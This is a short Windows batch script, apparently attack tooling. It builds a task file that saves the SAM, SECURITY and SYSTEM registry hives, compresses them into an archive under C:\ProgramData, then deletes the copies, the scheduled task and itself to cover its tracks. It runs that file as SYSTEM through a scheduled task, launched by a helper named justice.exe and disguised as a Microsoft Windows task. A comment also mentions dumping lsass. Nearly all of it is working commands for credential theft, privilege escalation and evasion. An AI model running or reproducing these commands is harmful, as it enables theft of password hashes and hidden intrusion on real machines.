rem save reg files
echo echo Yes ^| reg save hklm\sam C:\ProgramData\sam.save ^& > C:\ProgramData\servtask.bat
echo echo Yes ^| reg save hklm\security C:\ProgramData\security.save ^& >> C:\ProgramData\servtask.bat
echo echo Yes ^| reg save hklm\system C:\ProgramData\system.save ^& >> C:\ProgramData\servtask.bat

rem search for lsass.exe pid and take dump

rem copmress files
echo Powershell -c "Get-ChildItem C:\ProgramData\sam.save, C:\ProgramData\security.save, C:\ProgramData\system.save ^| Compress-Archive -DestinationPath C:\ProgramData\out.zip" ^& >> C:\ProgramData\servtask.bat

rem cleanup
echo del C:\ProgramData\sam.save ^& >> C:\ProgramData\servtask.bat
echo del C:\ProgramData\security.save ^& >> C:\ProgramData\servtask.bat
echo del C:\ProgramData\system.save ^& >> C:\ProgramData\servtask.bat

echo schtasks /DELETE /F /TN \Microsoft\Windows\WinSrv ^& >> C:\ProgramData\servtask.bat
echo del C:\ProgramData\servtask.bat >> C:\ProgramData\servtask.bat

justice.exe /exe C:\Windows\System32\cmd.exe /c "schtasks /Create /RU SYSTEM /TN \Microsoft\Windows\WinSrv /TR C:\ProgramData\servtask.bat /SC MINUTE"